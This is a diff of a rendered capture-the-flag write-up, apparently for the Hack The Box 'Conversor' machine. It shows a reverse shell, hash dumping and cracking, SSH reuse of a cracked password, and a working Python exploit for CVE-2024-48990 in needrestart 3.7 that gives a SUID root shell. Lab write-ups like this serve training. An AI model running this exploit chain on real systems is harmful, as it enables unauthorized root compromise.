     <div id="shell-as-www-data" class="anchor"></div>
@@ -1079,19 +1166,19 @@ no filename sanitization was found in the upload handler, enabling path traversa
     </span>
     
 </h2>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubla$ nc -lvnp <span style="color:#a5d6ff">5323</span>
-</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">5323</span> ...
-</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.80<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.129.4.226<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">51018</span>
-</span></span><span style="display:flex;"><span>www-data@conversor:~$ </span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">bubka@bubla$ nc -lvnp <span class="m">5323</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5323</span> ...
+</span></span><span class="line"><span class="ln">3</span><span class="cl">connect to <span class="o">[</span>10.10.14.80<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.4.226<span class="o">]</span> <span class="m">51018</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">www-data@conversor:~$ </span></span></code></pre></div></div>
 <p>i know that exist database. Analyzing <code>users.db</code> revealed hashes for users &lsquo;fismathack&rsquo;</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@conversor:~$ sqlite3 /var/www/conversor.htb/instance/users.db <span style="color:#a5d6ff">&#34;SELECT * FROM users;&#34;</span>
-</span></span><span style="display:flex;"><span>&lt;versor.htb/instance/users.db <span style="color:#a5d6ff">&#34;SELECT * FROM users;&#34;</span>
-</span></span><span style="display:flex;"><span>1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
-</span></span><span style="display:flex;"><span>5|bubka|d6f23513481dcdbb81a197a16ea36c5f</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">www-data@conversor:~$ sqlite3 /var/www/conversor.htb/instance/users.db <span class="s2">&#34;SELECT * FROM users;&#34;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&lt;versor.htb/instance/users.db <span class="s2">&#34;SELECT * FROM users;&#34;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">1<span class="p">|</span>fismathack<span class="p">|</span>5b5c3ac3a1c897c94caad48e6c71fdec
+</span></span><span class="line"><span class="ln">4</span><span class="cl">5<span class="p">|</span>bubka<span class="p">|</span>d6f23513481dcdbb81a197a16ea36c5f</span></span></code></pre></div></div>
 <p>cracking fismathack MD5 hash</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ echo <span style="color:#a5d6ff">&#34;5b5c3ac3a1c897c94caad48e6c71fdec&#34;</span> &gt; hash.txt
-</span></span><span style="display:flex;"><span>bubka@bubka$ hashcat -m <span style="color:#a5d6ff">0</span> -a <span style="color:#a5d6ff">0</span> hash.txt /usr/share/wordlists/rockyou.txt --show
-</span></span><span style="display:flex;"><span>5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">bubka@bubka$ <span class="nb">echo</span> <span class="s2">&#34;5b5c3ac3a1c897c94caad48e6c71fdec&#34;</span> &gt; hash.txt
+</span></span><span class="line"><span class="ln">2</span><span class="cl">bubka@bubka$ hashcat -m <span class="m">0</span> -a <span class="m">0</span> hash.txt /usr/share/wordlists/rockyou.txt --show
+</span></span><span class="line"><span class="ln">3</span><span class="cl">5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm</span></span></code></pre></div></div>
 
 <h2 class="relative group">Shell as fismathack
     <div id="shell-as-fismathack" class="anchor"></div>
@@ -1103,13 +1190,13 @@ no filename sanitization was found in the upload handler, enabling path traversa
     
 </h2>
 <p>using <code>ssh</code> with <code>Keepmesafeandwarm</code> password</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ ssh fismathack@conversor.htb
-</span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...
-</span></span><span style="display:flex;"><span>fismathack@conversor:~$ whoami
-</span></span><span style="display:flex;"><span>fismathack</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">bubka@bubka$ ssh fismathack@conversor.htb
+</span></span><span class="line"><span class="ln">2</span><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...
+</span></span><span class="line"><span class="ln">3</span><span class="cl">fismathack@conversor:~$ whoami
+</span></span><span class="line"><span class="ln">4</span><span class="cl">fismathack</span></span></code></pre></div></div>
 <p>getting user flag</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ cat ~/user.txt
-</span></span><span style="display:flex;"><span>55362fe3efcdfdcc6d8f0b6c474d4b6d</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">fismathack@conversor:~$ cat ~/user.txt
+</span></span><span class="line"><span class="ln">2</span><span class="cl">55362fe3efcdfdcc6d8f0b6c474d4b6d</span></span></code></pre></div></div>
 
 <h2 class="relative group">Shell as root
     <div id="shell-as-root" class="anchor"></div>
@@ -1120,66 +1207,66 @@ no filename sanitization was found in the upload handler, enabling path traversa
     </span>
     
 </h2>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ sudo -l
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff7b72">for</span> fismathack on conversor:
-</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
-</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">secure_path</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/sbin<span style="color:#79c0ff">\:</span>/usr/local/bin<span style="color:#79c0ff">\:</span>/usr/sbin<span style="color:#79c0ff">\:</span>/usr/bin<span style="color:#79c0ff">\:</span>/sbin<span style="color:#79c0ff">\:</span>/bin<span style="color:#79c0ff">\:</span>/snap/bin, use_pty
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User fismathack may run the following commands on conversor:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">(</span>ALL : ALL<span style="color:#ff7b72;font-weight:bold">)</span> NOPASSWD: /usr/sbin/needrestart
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>fismathack@conversor:~$ needrestart --version
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>needrestart 3.7 - Restart daemons after library updates.
-</span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">fismathack@conversor:~$ sudo -l
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Matching Defaults entries <span class="k">for</span> fismathack on conversor:
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">User fismathack may run the following commands on conversor:
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/sbin/needrestart
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">fismathack@conversor:~$ needrestart --version
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl">needrestart 3.7 - Restart daemons after library updates.
+</span></span><span class="line"><span class="ln">12</span><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...</span></span></code></pre></div></div>
 <p>checking <code>sudo -l</code> revealed that fismathack can run <code>/usr/sbin/needrestart</code> without a password. The installed version is 3.7. This version is vulnerable to <code>CVE-2024-48990</code> (Local Privilege Escalation), which allows arbitrary code execution via the -c config flag.</p>
 <p>I wrote a Python script to automate the exploitation:
 Create a malicious Perl config file that copies /bin/bash and sets the SUID bit. Execute sudo needrestart pointing to this config. Spawn the SUID shell.</p>
 <p>priv.py:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">sys</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">subprocess</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>config <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/tmp/bu.conf&#34;</span>
-</span></span><span style="display:flex;"><span>shell <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/tmp/bash&#34;</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#39;system(&#34;cp /bin/bash </span><span style="color:#a5d6ff">{</span>shell<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff"> &amp;&amp; chmod 4755 </span><span style="color:#a5d6ff">{</span>shell<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;);&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">try</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">with</span> open(config, <span style="color:#a5d6ff">&#34;w&#34;</span>) <span style="color:#ff7b72">as</span> f:
-</span></span><span style="display:flex;"><span>        f<span style="color:#ff7b72;font-weight:bold">.</span>write(payload)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    subprocess<span style="color:#ff7b72;font-weight:bold">.</span>run([<span style="color:#a5d6ff">&#34;sudo&#34;</span>, <span style="color:#a5d6ff">&#34;needrestart&#34;</span>, <span style="color:#a5d6ff">&#34;-c&#34;</span>, config], check<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">True</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> os<span style="color:#ff7b72;font-weight:bold">.</span>path<span style="color:#ff7b72;font-weight:bold">.</span>exists(config):
-</span></span><span style="display:flex;"><span>        os<span style="color:#ff7b72;font-weight:bold">.</span>remove(config)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> os<span style="color:#ff7b72;font-weight:bold">.</span>path<span style="color:#ff7b72;font-weight:bold">.</span>exists(shell):
-</span></span><span style="display:flex;"><span>        os<span style="color:#ff7b72;font-weight:bold">.</span>execl(shell, shell, <span style="color:#a5d6ff">&#34;-p&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72">except</span> <span style="color:#f0883e;font-weight:bold">Exception</span> <span style="color:#ff7b72">as</span> e:
-</span></span><span style="display:flex;"><span>    print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;Unexpected error: </span><span style="color:#a5d6ff">{</span>e<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
-</span></span><span style="display:flex;"><span>    sys<span style="color:#ff7b72;font-weight:bold">.</span>exit(<span style="color:#a5d6ff">1</span>)</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">config</span> <span class="o">=</span> <span class="s2">&#34;/tmp/bu.conf&#34;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="s2">&#34;/tmp/bash&#34;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;system(&#34;cp /bin/bash </span><span class="si">{</span><span class="n">shell</span><span class="si">}</span><span class="s1"> &amp;&amp; chmod 4755 </span><span class="si">{</span><span class="n">shell</span><span class="si">}</span><span class="s1">&#34;);&#39;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">config</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&#34;sudo&#34;</span><span class="p">,</span> <span class="s2">&#34;needrestart&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="n">config</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">config</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">shell</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">execl</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">shell</span><span class="p">,</span> <span class="s2">&#34;-p&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Unexpected error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></span></span></code></pre></div></div>
 <p>Root obtained.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ python3 priv.py 
-</span></span><span style="display:flex;"><span>Scanning processes...                                                                                              
-</span></span><span style="display:flex;"><span>Scanning linux images...                                                                                           
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Running kernel seems to be up-to-date.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>No services need to be restarted.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>No containers need to be restarted.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>No user sessions are running outdated binaries.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>No VM guests are running outdated hypervisor <span style="color:#ff7b72;font-weight:bold">(</span>qemu<span style="color:#ff7b72;font-weight:bold">)</span> binaries on this host.
-</span></span><span style="display:flex;"><span>rootbash-5.1# whoami
-</span></span><span style="display:flex;"><span>root
-</span></span><span style="display:flex;"><span>rootbash-5.1# </span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">fismathack@conversor:~$ python3 priv.py 
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Scanning processes...                                                                                              
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Scanning linux images...                                                                                           
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Running kernel seems to be up-to-date.
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">No services need to be restarted.
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">No containers need to be restarted.
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl">No user sessions are running outdated binaries.
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl">No VM guests are running outdated hypervisor <span class="o">(</span>qemu<span class="o">)</span> binaries on this host.
+</span></span><span class="line"><span class="ln">14</span><span class="cl">rootbash-5.1# whoami
+</span></span><span class="line"><span class="ln">15</span><span class="cl">root
+</span></span><span class="line"><span class="ln">16</span><span class="cl">rootbash-5.1# </span></span></code></pre></div></div>
 <p>and flag:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rootbash-5.1# cat /root/root.txt
-</span></span><span style="display:flex;"><span>2ddbf40c03a3c45866748ea7e8c69444</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">rootbash-5.1# cat /root/root.txt
+</span></span><span class="line"><span class="ln">2</span><span class="cl">2ddbf40c03a3c45866748ea7e8c69444</span></span></code></pre></div></div>
 
           
           
